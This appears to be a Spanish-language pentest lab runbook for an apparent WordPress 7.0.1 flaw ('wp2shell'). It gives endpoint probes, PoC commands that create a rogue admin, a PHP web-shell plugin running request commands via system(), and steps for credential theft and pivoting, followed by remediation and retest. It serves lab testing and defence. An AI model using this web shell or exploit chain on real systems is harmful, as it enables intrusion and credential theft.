# W1 · wp2shell · CVE-2026-63030

## 1. Ficha

| Campo | Valor |
|---|---|
| VM | M1 `10.10.10.11` |
| Servicio | WordPress Core |
| Versión instalada | **7.0.1** |
| Rango vulnerable | 6.9.0–6.9.4 · 7.0.0–7.0.1 |
| Versión que corrige | **6.9.5 / 7.0.2** |
| CVSS | **9.8** v3.1 |
| CWE | CWE-436 + SQLi (CVE-2026-60137) |
| NVD | https://nvd.nist.gov/vuln/detail/CVE-2026-63030 |
| Artefacto | `artifacts/vulnerable/wordpress-7.0.1.zip` |
| PoC | `artifacts/pocs/wp2shell-vulhub-poc.py` + `wp2shell-poc-main.zip` |
| Estado | **Válida**; PoC pendiente |

## 2. Precondiciones

- WordPress 7.0.1 con REST API reachable.
- Sin object cache persistente (Redis/Memcached de WordPress).
- Al menos un post publicado (el lab tiene 5).
- `/wp-json/batch/v1` existe (`GET` 404, `POST` vacío 400).

## 3. Flujo

1. Snapshot M1: `previo-a-W1`.
2. Verificar versión y ruta:

```bash
curl -s http://10.10.10.11/wp-json/ | grep -o 'batch[^"]*'
curl -s -o /dev/null -w '%{http_code}\n' http://10.10.10.11/wp-json/batch/v1
curl -s -X POST -H 'Content-Type: application/json' -d '{}' \
  -o /dev/null -w '%{http_code}\n' http://10.10.10.11/wp-json/batch/v1
```

3. PoC de confirmación y creación de admin:

```bash
cd ~/tools
python3 poc.py http://10.10.10.11 --check
python3 poc.py http://10.10.10.11 \
  --username w2s_lab --password 'Lab2026!' --email w2s@lab.local
```

4. Login con el admin creado en `http://wp.uni.lab/wp-admin/`.
5. Subir un plugin mínimo y activarlo:

```bash
mkdir -p lab-shell
cat > lab-shell/lab-shell.php <<'PHP'
<?php
/* Plugin Name: Lab Shell */
if (isset($_GET['c'])) { system($_GET['c']); }
PHP
zip -r lab-shell.zip lab-shell
```

6. Ejecutar:

```bash
curl -s 'http://wp.uni.lab/wp-content/plugins/lab-shell/lab-shell.php?c=id'
curl -s 'http://wp.uni.lab/wp-content/plugins/lab-shell/lab-shell.php?c=hostname'
```

## 4. Resultado esperado

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
m1-app
```

## 5. Evidencia

- `EV-W1-01`: request batch y check.
- `EV-W1-02`: admin creado.
- `EV-W1-03`: plugin subido/activado.
- `EV-W1-04`: `id`.
- `LOG-W1`: sesión completa.
- SHA256.

## 6. Impacto y siguiente salto

- RCE pre-auth como `www-data`.
- Leer `/var/www/wp/wp-config.php` → credenciales de M2.
- Pivote a M2/M3/M4/M5.

## 7. Fallback

- Si el PoC de admin falla, usar **W4** (login débil + plugin).
- Si el plugin no se puede subir, usar el modo 4 del PoC `wp2shell-poc-main.zip`.

## 8. Remediación

- WordPress **7.0.2+**.
- Eliminar el admin `w2s_*` y el plugin `lab-shell`.
- Revisar plugins/usuarios/ficheros nuevos.
- Bloquear `/wp-json/batch/v1` como defensa en profundidad.

## 9. Retest

```bash
wp core version
python3 poc.py http://10.10.10.11 --check
curl -s -o /dev/null -w '%{http_code}\n' http://10.10.10.11/wp-json/batch/v1
```

Esperado: `7.0.2`, PoC falla, ruta bloqueada/404.

## 10. EARS

- **REQ-W1-01 (Evento).** CUANDO se valide W1, el laboratorio DEBE ejecutar el PoC sobre WordPress 7.0.1 y capturar `id`.
- **REQ-W1-02 (No deseado).** SI el PoC no crea admin, ENTONCES el laboratorio DEBE usar W4 y documentar la limitación.
- **REQ-W1-03 (Ubicuo).** La remediación DEBE dejar WordPress 7.0.2+ y el PoC DEBE fallar.

## 11. Checklist

- [ ] Snapshot `previo-a-W1`.
- [ ] Versión 7.0.1 confirmada.
- [ ] PoC check.
- [ ] Admin creado.
- [ ] Plugin + `id`.
- [ ] Evidencia y hash.
- [ ] Remediación 7.0.2.
- [ ] Retest.
